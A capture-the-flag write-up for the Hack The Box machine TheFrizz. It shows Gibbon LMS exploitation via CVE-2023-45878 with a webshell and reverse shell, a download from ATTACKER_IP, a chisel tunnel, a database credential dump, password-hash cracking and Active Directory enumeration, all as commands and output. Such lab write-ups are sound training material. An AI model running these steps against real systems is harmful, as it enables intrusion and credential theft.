---
title: "🪄 HTB TheFrizz Write-up"
name: TheFrizz
date: 2025-08-23
difficulty: Medium
os: Windows
skills: "Enumeration, Reverse Shell, Credential Hunting, Password Reuse, Chisel Port Forwarding, Database Looting, Kerberos, Recycle Bin artefact recovery, Password Spraying, GPO Abuse"
tools: "rustscan, nmap, CVE-2023-45878, nc, chisel, mysql, hashcat, nxc, bloodhound-python, BloodHound, ssh, scp, impacket-getTGT, SharpGPOAbuse, RunasCs" 
published: true
---

![](images/Pasted%20image%2020250722112116.png)

## 📝 Summary

An outdated Gibbon Learning Management System vulnerable to CVE-2023-45878 allowed me to gain unauthenticated RCE access as `w.webservice`.
The sha256 password hash and salt for user Fiona Frizzle were exfiltrated from the MySQL database.  The password was cracked using `hashcat`.

Fiona was a member of the `Remote Management Users` group, but `FRIZZDC` didn't have WinRM ports `5985/tcp` or `5986/tcp` open, but SSH (`22/tcp`) was open.  Looking at the `sshd_config` showed that `Remote Management Users` can SSH to the server instead, but not with a password, only using Kerberos authentication.

I requested a Kerberos Ticket Granting Ticket (TGT) for Fiona and used that to SSH to `FRIZZDC`.  Fiona deleted a backup file for a WAPT server, which contained sensitive password information, but forgot to empty the Recycle Bin.  I retrieved the backup and found that it contained the password for user `M.SchoolBus`.

`M.SchoolBus` was also a member of the `Remote Management Users` group.  I requested a new Kerberos TGT for M.SchoolBus and used it to SSH to `FRIZZDC`.
BloodHound revealed that this user had rights to manipulate Group Policy Objects (GPOs) on the Domain Controllers OU.

I created a malicious GPO to grant M.SchoolBus Administrator privileges and compromised the domain...

## 🏫 Walkerville Elementary School Website

### 🔎 Recon

**Initial scan** revealed some interesting open ports:
- `22/tcp`: OpenSSH for_Windows_9.5
- `80/tcp`: Apache httpd 2.4.58
- `53/tcp`, `88/tcp`, `135/tcp`, `139/tcp`, `389/tcp`, `445/tcp`, `464/tcp`, `593/tcp`, `636/tcp`, `3268/tcp`, `3269/tcp`, `9389/tcp`: Microsoft Windows Active Directory

```
fcoomans@kali:~/htb/thefrizz$ rustscan -a 10.10.11.60 --tries 5 --ulimit 10000 -- -sCV -oA thefrizz_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.60:22
Open 10.10.11.60:53
Open 10.10.11.60:80
Open 10.10.11.60:88
Open 10.10.11.60:135
Open 10.10.11.60:139
Open 10.10.11.60:389
Open 10.10.11.60:445
Open 10.10.11.60:464
Open 10.10.11.60:593
Open 10.10.11.60:636
Open 10.10.11.60:3268
Open 10.10.11.60:3269
Open 10.10.11.60:9389
Open 10.10.11.60:49664
Open 10.10.11.60:49667
Open 10.10.11.60:49670
Open 10.10.11.60:60192
Open 10.10.11.60:60196
Open 10.10.11.60:60205
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA thefrizz_tcp_all" on ip 10.10.11.60
Depending on the complexity of the script, results may take some time to appear.

<SNIP>

Nmap scan report for 10.10.11.60
Host is up, received echo-reply ttl 127 (0.18s latency).
Scanned at 2025-07-21 13:53:37 SAST for 104s

PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-21 18:53:44Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
60192/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60196/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60205/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

After pointing `frizzdc.frizz.htb` and `frizz.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/thefrizz$ grep frizz.htb /etc/hosts
10.10.11.60     frizzdc.frizz.htb frizz.htb
```

I run an `nmap` port scan for the top 100 open UDP ports on `frizzdc.frizz.htb`.  Three open ports were discovered:
- `53/udp`: DNS
- `88/udp`: Kerberos
- `123/udp`: Microsoft Windows SNTP

```
fcoomans@kali:~/htb/thefrizz$ nmap --top-ports 100 --open -sU frizzdc.frizz.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 13:58 SAST
Nmap scan report for frizzdc.frizz.htb (10.10.11.60)
Host is up (0.18s latency).
rDNS record for 10.10.11.60: frizz.htb
Not shown: 97 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp

Nmap done: 1 IP address (1 host up) scanned in 5.02 seconds
```

The website shows the available courses and pricing for the `Walkerville Elementary School`.

![](images/Pasted%20image%2020250721140018.png)

Clicking on the `Staff Login` opens the login portal for Students and Staff.  At the bottom of the page, it shows that this is using the Gibbon v25.0.00 LMS.

![](images/Pasted%20image%2020250721151406.png)

### 🧪 Exploitation

#### 🐞 CVE-2023-45878

Gibbon v25.0.00 is vulnerable to unauthenticated RCE as seen in CVE-2023-45878 (https://nvd.nist.gov/vuln/detail/CVE-2023-45878 and https://pentest-tools.com/vulnerabilities-exploits/gibbon-lms-v25001-file-upload-to-rce_27078).

I decided to use 0xyy66's PoC, which can be found at https://github.com/0xyy66/CVE-2023-45878_to_RCE.  The repo was cloned.

```
fcoomans@kali:~/htb/thefrizz$ git clone https://github.com/0xyy66/CVE-2023-45878_to_RCE.git
Cloning into 'CVE-2023-45878_to_RCE'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 4.07 KiB | 2.04 MiB/s, done.
Resolving deltas: 100% (1/1), done.
```

And a `nc` listener was started on the attack host.

```
fcoomans@kali:~/htb/thefrizz$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

The PoC was then launched.  A reverse shell is uploaded to the target, and I am prompted to press ENTER to trigger the reverse shell.  I press ENTER, as the `nc` listener was already running.

```
fcoomans@kali:~/htb/thefrizz$ cd CVE-2023-45878_to_RCE

fcoomans@kali:~/htb/thefrizz/CVE-2023-45878_to_RCE$ ./CVE-2023-45878.sh ATTACKER_IP 4444 frizzdc.frizz.htb
Generating TCP reverse shell
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: 7zip.exe
TCP reverse shell generated: 7zip.exe
Spawining a webshell on the target
Shell available at http://frizzdc.frizz.htb/Gibbon-LMS/gibbon_myconfig.php?cmd=whoami
Python http.server started on port 80 - PID: 57058
10.10.11.60 - - [21/Jul/2025 15:02:04] "GET /7zip.exe HTTP/1.1" 200 -
Reverse shell uploaded
./CVE-2023-45878.sh: line 48: 57058 Killed                  python -m http.server $py_http_srv_port > /dev/null
Start a listener on port 4444, press ENTER when you are ready to execute the reverse shell on the target.
Netcat: nc -lnvp 4444
Msfconsole:  use exploit/multi/handler; set lhost ATTACKER_IP; set lport 4444; run
```

### 💰 Post Exploitation

#### 👣 Foothold as w.webservice

The `nc` listener catches the reverse shell launched by user `w.webservice`.

```
fcoomans@kali:~/htb/thefrizz$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.60] 65509
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\Gibbon-LMS>whoami
whoami
frizz\w.webservice
```

## 🔼 Priv Esc to Fiona

### 🔎 Recon

The `config.php` file reveals the database credentials.

```
C:\xampp\htdocs\Gibbon-LMS>type config.php
type config.php
<?php

<SNIP>

/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';

/**
 * Sets a globally unique id, to allow multiple installs on a single server.
 */
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';

<SNIP>
```

`netstat` shows that port `3306/tcp` is also open, which the initial scan didn't show.  The MySQL port is most likely blocked by the firewall.

```
C:\xampp\htdocs\Gibbon-LMS>netstat -ano |findstr LISTEN
netstat -ano |findstr LISTEN

<SNIP>

  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       3120

<SNIP>
```

### 🧪 Exploitation

Chisel, which is part of the `chisel-common-binaries` package on Kali, can be used for reverse port forwarding as a limited-rights user.

The `chisel` executable is shared using a Python web server.

```
fcoomans@kali:~/htb/thefrizz$ dpkg -S /usr/share/chisel-common-binaries/chisel_1.10.1_windows_amd64.exe
chisel-common-binaries: /usr/share/chisel-common-binaries/chisel_1.10.1_windows_amd64.exe

fcoomans@kali:~/htb/thefrizz$ python -m http.server -d /usr/share/chisel-common-binaries
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And downloaded on the target.

```
C:\xampp\htdocs\Gibbon-LMS>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\xampp\htdocs\Gibbon-LMS> cd $env:temp
cd $env:temp
PS C:\Users\W522A~1.WEB\AppData\Local\Temp> iwr http://ATTACKER_IP:8000/chisel_1.10.1_windows_amd64.exe -outfile chisel.exe
iwr http://ATTACKER_IP:8000/chisel_1.10.1_windows_amd64.exe -outfile chisel.exe
```

A `chisel` server is started on the attack host with the `--reverse` options, which will allow a port forward to be specified from the client side.

```
fcoomans@kali:~/htb/thefrizz$ /usr/share/chisel-common-binaries/chisel_1.10.1_linux_amd64 server --port 8081 --reverse
2025/07/21 15:36:18 server: Reverse tunnelling enabled
2025/07/21 15:36:18 server: Fingerprint eHGcOG5GttVaaZ1jcOOhx/XI4WdQHhxuRPF1Gs6CG/0=
2025/07/21 15:36:18 server: Listening on http://0.0.0.0:8081
```

The `chisel` client is started on the target, and port `3306` is reverse port forwarded to the attack host.

```
PS C:\Users\W522A~1.WEB\AppData\Local\Temp> .\chisel.exe client ATTACKER_IP:8081 R:127.0.0.1:3306:127.0.0.1:3306
.\chisel.exe client ATTACKER_IP:8081 R:127.0.0.1:3306:127.0.0.1:3306
2025/07/21 13:37:22 client: Connecting to ws://ATTACKER_IP:8081
2025/07/21 13:37:23 client: Connected (Latency 184.914ms)
```

The `mysql` client is used on the attack host to connect to the MySQL server on the target, using the credentials found in the `config.php` file.  The `gibbonperson` table contains the credentials for user `Fiona Frizzle`.

```
fcoomans@kali:~/htb/thefrizz$ mysql -h 127.0.0.1 -u MrGibbonsDB -p --skip-ssl
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 13
Server version: 10.4.32-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gibbon             |
| information_schema |
| test               |
+--------------------+
3 rows in set (0.185 sec)

MariaDB [(none)]> use gibbon;

<SNIP>

MariaDB [gibbon]> select * from gibbonperson;
+----------------+-------+---------+-----------+---------------+---------------+------------------+-------------+-----------+------------------------------------------------------------------+------------------------+--------------------+--------+----------+---------------------+-----------------+------+---------------------+----------------+-----------+---------------+---------------------+-------------------+-------------------+-----------+----------+------------------+-----------------+----------+------------------+-----------------+------------+-------------------+--------+------------+-------------------+--------+------------+-------------------+--------+------------+-------------------+--------+---------+---------------+----------------+---------------+----------------+----------------------+-----------+----------+------------+----------+----------+----------------+-------------------+-------------------+------------------------+----------------+-------------------+-------------------+------------------------+---------------+-----------+-----------+---------+---------------------------+------------+------------+-----------------+-----------+----------------+----------------------+--------------------+----------------------+--------------------------+-------------------------+--------------+---------------------+--------------------+-------------------+---------+---------+-----------------------+----------------------+-------------------+-----------------------+--------------------------+------------------------+---------------------------+-----------+----------+---------------+--------+
| gibbonPersonID | title | surname | firstName | preferredName | officialName  | nameInCharacters | gender      | username  | passwordStrong                                                   | passwordStrongSalt     | passwordForceReset | status | canLogin | gibbonRoleIDPrimary | gibbonRoleIDAll | dob  | email               | emailAlternate | image_240 | lastIPAddress | lastTimestamp       | lastFailIPAddress | lastFailTimestamp | failCount | address1 | address1District | address1Country | address2 | address2District | address2Country | phone1Type | phone1CountryCode | phone1 | phone3Type | phone3CountryCode | phone3 | phone2Type | phone2CountryCode | phone2 | phone4Type | phone4CountryCode | phone4 | website | languageFirst | languageSecond | languageThird | countryOfBirth | birthCertificateScan | ethnicity | religion | profession | employer | jobTitle | emergency1Name | emergency1Number1 | emergency1Number2 | emergency1Relationship | emergency2Name | emergency2Number1 | emergency2Number2 | emergency2Relationship | gibbonHouseID | studentID | dateStart | dateEnd | gibbonSchoolYearIDClassOf | lastSchool | nextSchool | departureReason | transport | transportNotes | calendarFeedPersonal | viewCalendarSchool | viewCalendarPersonal | viewCalendarSpaceBooking | gibbonApplicationFormID | lockerNumber | vehicleRegistration | personalBackground | messengerLastRead | privacy | dayType | gibbonThemeIDPersonal | gibboni18nIDPersonal | studentAgreements | googleAPIRefreshToken | microsoftAPIRefreshToken | genericAPIRefreshToken | receiveNotificationEmails | mfaSecret | mfaToken | cookieConsent | fields |
+----------------+-------+---------+-----------+---------------+---------------+------------------+-------------+-----------+------------------------------------------------------------------+------------------------+--------------------+--------+----------+---------------------+-----------------+------+---------------------+----------------+-----------+---------------+---------------------+-------------------+-------------------+-----------+----------+------------------+-----------------+----------+------------------+-----------------+------------+-------------------+--------+------------+-------------------+--------+------------+-------------------+--------+------------+-------------------+--------+---------+---------------+----------------+---------------+----------------+----------------------+-----------+----------+------------+----------+----------+----------------+-------------------+-------------------+------------------------+----------------+-------------------+-------------------+------------------------+---------------+-----------+-----------+---------+---------------------------+------------+------------+-----------------+-----------+----------------+----------------------+--------------------+----------------------+--------------------------+-------------------------+--------------+---------------------+--------------------+-------------------+---------+---------+-----------------------+----------------------+-------------------+-----------------------+--------------------------+------------------------+---------------------------+-----------+----------+---------------+--------+
|     0000000001 | Ms.   | Frizzle | Fiona     | Fiona         | Fiona Frizzle |                  | Unspecified | f.frizzle | 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 | /aACFhikmNopqrRTVz2489 | N                  | Full   | Y        |                 001 | 001             | NULL | f.frizzle@frizz.htb | NULL           | NULL      | ::1           | 2024-10-29 09:28:59 | NULL              | NULL              |         0 |          |                  |                 |          |                  |                 |            |                   |        |            |                   |        |            |                   |        |            |                   |        |         |               |                |               |                |                      |           |          |            |          |          |                |                   |                   |                        |                |                   |                   |                        |          NULL |           | NULL      | NULL    |                      NULL |            |            |                 |           |                |                      | Y                  | Y                    | N                        |                    NULL |              |                     |                    | NULL              | NULL    | NULL    |                  NULL |                 NULL | NULL              |                       |                          |                        | Y                         | NULL      | NULL     | NULL          |        |
+----------------+-------+---------+-----------+---------------+---------------+------------------+-------------+-----------+------------------------------------------------------------------+------------------------+--------------------+--------+----------+---------------------+-----------------+------+---------------------+----------------+-----------+---------------+---------------------+-------------------+-------------------+-----------+----------+------------------+-----------------+----------+------------------+-----------------+------------+-------------------+--------+------------+-------------------+--------+------------+-------------------+--------+------------+-------------------+--------+---------+---------------+----------------+---------------+----------------+----------------------+-----------+----------+------------+----------+----------+----------------+-------------------+-------------------+------------------------+----------------+-------------------+-------------------+------------------------+---------------+-----------+-----------+---------+---------------------------+------------+------------+-----------------+-----------+----------------+----------------------+--------------------+----------------------+--------------------------+-------------------------+--------------+---------------------+--------------------+-------------------+---------+---------+-----------------------+----------------------+-------------------+-----------------------+--------------------------+------------------------+---------------------------+-----------+----------+---------------+--------+
1 row in set (0.185 sec)

MariaDB [gibbon]> exit
Bye
```

https://github.com/GibbonEdu/core/blob/v25.0.00/modules/User%20Admin/user_manage_passwordProcess.php shows that `$passwordStrong` is generated using:

```php
$salt = getSalt();
$passwordStrong = hash('sha256', $salt.$passwordNew);
```

![](images/Pasted%20image%2020250822124743.png)

https://hashcat.net/wiki/doku.php?id=example_hashes shows that mode `1420` uses the same hashing algorithm, but the example shows that the password hash goes first, followed by the salt.

![](images/Pasted%20image%2020250822125043.png)

The hash is saved in `hash.txt` in the format `passwordStrong:passwordStrongSalt`

```
fcoomans@kali:~/htb/thefrizz$ cat hash.txt
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
```

`hashcat` is then used to crack the hash using the `rockyou.txt` wordlist.  Fiona's password is `Jenni_Luvs_Magic23`.

```
fcoomans@kali:~/htb/thefrizz$ hashcat -m 1420 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1420 (sha256($salt.$pass))

<SNIP>
```

### 💰 Post Exploitation

I use `ntpdate` to sync the attack host time with the target.

```
fcoomans@kali:~/htb/thefrizz$ sudo ntpdate frizzdc.frizz.htb
2025-07-21 23:22:31.639881 (+0200) +25200.001351 +/- 0.091444 frizzdc.frizz.htb 10.10.11.60 s1 no-leap
CLOCK: time stepped by 25200.001351
```

And then use `nxc` to validate Fiona's credentials.

```
fcoomans@kali:~/htb/thefrizz$ nxc ldap frizzdc.frizz.htb -u f.frizzle -p Jenni_Luvs_Magic23 -k
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [*] None (name:FRIZZDC) (domain:frizz.htb)
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
```

## 🐚🐕 SSH with Kerberos 

### 🔎 Recon

Active Directory Enumeration reveals that 
- `M.Schoolbus` is a member of the `Desktop Admins` and `Remote Management Users` groups.
- `f.frizzle` is a member of the `Remote Management Users` group.

```
fcoomans@kali:~/htb/thefrizz$ nxc ldap frizzdc.frizz.htb -u f.frizzle -p Jenni_Luvs_Magic23 -k --users-export domain_users.txt
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [*] None (name:FRIZZDC) (domain:frizz.htb)
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [*] Enumerated 21 domain users: frizz.htb
LDAP        frizzdc.frizz.htb 389    FRIZZDC          -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        frizzdc.frizz.htb 389    FRIZZDC          Administrator                 2025-02-25 23:24:10 0        Built-in account for administering the computer/domain
LDAP        frizzdc.frizz.htb 389    FRIZZDC          Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        frizzdc.frizz.htb 389    FRIZZDC          krbtgt                        2024-10-29 16:19:54 0        Key Distribution Center Service Account
LDAP        frizzdc.frizz.htb 389    FRIZZDC          f.frizzle                     2024-10-29 16:27:03 0        Wizard in Training
LDAP        frizzdc.frizz.htb 389    FRIZZDC          w.li                          2024-10-29 16:27:03 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          h.arm                         2024-10-29 16:27:03 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          M.SchoolBus                   2024-10-29 16:27:03 0        Desktop Administrator
LDAP        frizzdc.frizz.htb 389    FRIZZDC          d.hudson                      2024-10-29 16:27:03 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          k.franklin                    2024-10-29 16:27:03 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          l.awesome                     2024-10-29 16:27:03 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          t.wright                      2024-10-29 16:27:03 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          r.tennelli                    2024-10-29 16:27:04 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          J.perlstein                   2024-10-29 16:27:04 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          a.perlstein                   2024-10-29 16:27:04 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          p.terese                      2024-10-29 16:27:04 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          v.frizzle                     2024-10-29 16:27:04 0        The Wizard
LDAP        frizzdc.frizz.htb 389    FRIZZDC          g.frizzle                     2024-10-29 16:27:04 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          c.sandiego                    2024-10-29 16:27:04 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          c.ramon                       2024-10-29 16:27:04 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          m.ramon                       2024-10-29 16:27:04 0        Student
LDAP        frizzdc.frizz.htb 389    FRIZZDC          w.Webservice                  2024-10-29 16:27:04 0        Service for the website
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [*] Writing 21 local users to domain_users.txt

fcoomans@kali:~/htb/thefrizz$ nxc ldap frizzdc.frizz.htb -u f.frizzle -p Jenni_Luvs_Magic23 -k --groups |grep -v "membercount: 0"
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          [*] None (name:FRIZZDC) (domain:frizz.htb)
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          Administrators                           membercount: 2
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          Users                                    membercount: 3
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          Guests                                   membercount: 2
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          IIS_IUSRS                                membercount: 1
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          Remote Management Users                  membercount: 2
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          Schema Admins                            membercount: 1
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          Enterprise Admins                        membercount: 1
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          Domain Admins                            membercount: 2
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          Group Policy Creator Owners              membercount: 2
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          Pre-Windows 2000 Compatible Access       membercount: 1
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          Windows Authorization Access Group       membercount: 1
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          Denied RODC Password Replication Group   membercount: 8
LDAP                     frizzdc.frizz.htb 389    FRIZZDC          Desktop Admins                           membercount: 1

fcoomans@kali:~/htb/thefrizz$ nxc ldap frizzdc.frizz.htb -u f.frizzle -p Jenni_Luvs_Magic23 -k --groups Administrators
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [*] None (name:FRIZZDC) (domain:frizz.htb)
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
LDAP        frizzdc.frizz.htb 389    FRIZZDC          Administrator

fcoomans@kali:~/htb/thefrizz$ nxc ldap frizzdc.frizz.htb -u f.frizzle -p Jenni_Luvs_Magic23 -k --groups "Remote Management Users"
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [*] None (name:FRIZZDC) (domain:frizz.htb)
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
LDAP        frizzdc.frizz.htb 389    FRIZZDC          M.SchoolBus
LDAP        frizzdc.frizz.htb 389    FRIZZDC          f.frizzle

fcoomans@kali:~/htb/thefrizz$ nxc ldap frizzdc.frizz.htb -u f.frizzle -p Jenni_Luvs_Magic23 -k --groups "Desktop Admins"
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [*] None (name:FRIZZDC) (domain:frizz.htb)
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
LDAP        frizzdc.frizz.htb 389    FRIZZDC          M.SchoolBus

fcoomans@kali:~/htb/thefrizz$ nxc smb frizzdc.frizz.htb -u f.frizzle -p Jenni_Luvs_Magic23 -k --pass-pol
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
SMB         frizzdc.frizz.htb 445    frizzdc          [+] Dumping password info for domain: frizz
SMB         frizzdc.frizz.htb 445    frizzdc          Minimum password length: None
SMB         frizzdc.frizz.htb 445    frizzdc          Password history length: None
SMB         frizzdc.frizz.htb 445    frizzdc          Maximum password age: Not Set
SMB         frizzdc.frizz.htb 445    frizzdc
SMB         frizzdc.frizz.htb 445    frizzdc          Password Complexity Flags: 000001
SMB         frizzdc.frizz.htb 445    frizzdc            Domain Refuse Password Change: 0
SMB         frizzdc.frizz.htb 445    frizzdc            Domain Password Store Cleartext: 0
SMB         frizzdc.frizz.htb 445    frizzdc            Domain Password Lockout Admins: 0
SMB         frizzdc.frizz.htb 445    frizzdc            Domain Password No Clear Change: 0
SMB         frizzdc.frizz.htb 445    frizzdc            Domain Password No Anon Change: 0
SMB         frizzdc.frizz.htb 445    frizzdc            Domain Password Complex: 1
SMB         frizzdc.frizz.htb 445    frizzdc
SMB         frizzdc.frizz.htb 445    frizzdc          Minimum password age: None
SMB         frizzdc.frizz.htb 445    frizzdc          Reset Account Lockout Counter: 30 minutes
SMB         frizzdc.frizz.htb 445    frizzdc          Locked Account Duration: 30 minutes
SMB         frizzdc.frizz.htb 445    frizzdc          Account Lockout Threshold: None
SMB         frizzdc.frizz.htb 445    frizzdc          Forced Log off Time: Not Set

fcoomans@kali:~/htb/thefrizz$ nxc smb frizzdc.frizz.htb -u f.frizzle -p Jenni_Luvs_Magic23 -k --shares
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
SMB         frizzdc.frizz.htb 445    frizzdc          [*] Enumerated shares
SMB         frizzdc.frizz.htb 445    frizzdc          Share           Permissions     Remark
SMB         frizzdc.frizz.htb 445    frizzdc          -----           -----------     ------
SMB         frizzdc.frizz.htb 445    frizzdc          ADMIN$                          Remote Admin
SMB         frizzdc.frizz.htb 445    frizzdc          C$                              Default share
SMB         frizzdc.frizz.htb 445    frizzdc          IPC$            READ            Remote IPC
SMB         frizzdc.frizz.htb 445    frizzdc          NETLOGON        READ            Logon server share
SMB         frizzdc.frizz.htb 445    frizzdc          SYSVOL          READ            Logon server share
```

`bloodhound-python` is then used to collect AD information.  This is uploaded to BloodHound.

```
fcoomans@kali:~/htb/thefrizz$ bloodhound-python --zip -ns 10.10.11.60 -d frizz.htb -c All --dns-tcp -u f.frizzle -p Jenni_Luvs_Magic23
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: frizz.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: frizzdc.frizz.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: frizzdc.frizz.htb
INFO: Found 22 users
INFO: Found 53 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: frizzdc.frizz.htb
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
INFO: Done in 00M 39S
INFO: Compressing output into 20250721232901_bloodhound.zip
```

